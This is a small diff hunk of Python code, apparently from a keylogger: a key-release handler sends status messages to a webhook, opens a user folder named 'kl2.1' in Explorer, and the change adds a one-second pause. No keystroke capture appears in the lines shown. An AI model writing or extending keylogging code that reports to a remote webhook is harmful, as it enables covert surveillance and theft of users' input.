@@ -91,6 +91,7 @@ def on_release(key):
         send_to_webhook(f"Connection stopped by user: {username}")
         file_path = rf"C:\users\{username}\kl2.1"  # Fixed the file path
         subprocess.run(["explorer", file_path])
+        time.sleep(1)
         send_to_webhook(f"Opened dir...")
         return False
 
